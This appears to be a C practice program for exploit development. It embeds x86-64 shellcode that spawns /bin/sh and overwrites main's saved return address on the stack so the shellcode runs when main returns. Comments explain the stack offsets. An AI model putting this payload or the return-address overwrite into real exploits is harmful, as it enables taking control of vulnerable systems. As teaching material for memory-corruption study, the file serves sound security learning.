#include <stdlib.h>
#include <stdio.h>



char shellcode[] = "\xeb\x2b\x5b\x48\x89\x5b\x08\xc6\x43\x07\x00\x48\xc7\x43\x10\x00\x00\x00\x00\xba\x00\x00\x00\x00\x48\x8d\x73\x08\x48\x89\xdf\xb8\x3b\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\x0f\x05\xe8\xd0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x90\x5d\x00\x00";

int main(){
	/*
	* OVERRIDE THE RIP VALUE ON THE STACK
	*/
	long *ret;

	ret = (long *)&ret + 2;
	/*
	so ret is a pointer, its size on 64 bit process is 8 bytes, going 8 bytes past this we will reach rbp, the size of which is also 8 bytes so must go another 8 bytes to reach eip on the stack
	*/
	(*ret) = (long)shellcode; /*
	we need to override the address of rip to the adress of the first charac in the shellcode, since sizeof(char*) is 8 we can convert it to long to override the rip; the value on the machine is the same, it's just so that the compiler doesn't complain that we are assigning char* to long
	*/
	
}
